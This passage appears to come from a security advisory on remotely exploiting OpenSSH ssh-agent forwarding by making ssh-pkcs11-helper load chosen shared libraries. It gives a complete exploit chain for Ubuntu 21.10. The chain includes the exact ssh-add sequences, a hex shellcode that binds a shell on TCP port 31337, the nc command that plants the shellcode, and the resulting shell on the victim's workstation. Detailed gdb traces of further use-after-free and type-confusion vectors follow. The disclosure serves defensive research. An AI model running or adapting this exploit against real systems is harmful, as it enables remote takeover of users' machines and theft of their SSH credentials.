(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F21.10%2Fubuntu-21.10-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=s6Y9CILGTxKnr0Ox53dA8v%2F2OblH63SBJOKvTb91jsE%3D&reserved=0><<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Fubuntu%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=M9UUStPZtnN1Zm6vzhcYoELovmTTib8juOO796aOFXE%3D&reserved=0><<https://old-releases.ubuntu.com/ubuntu/>> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@...+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@...+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new@....plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        # 0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@...+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@...+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan@....plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00, tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed: /usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190, MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

57296      0x00007f7c8ea99470 <_Unwind_GetCFA@...+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@...+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA@....plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

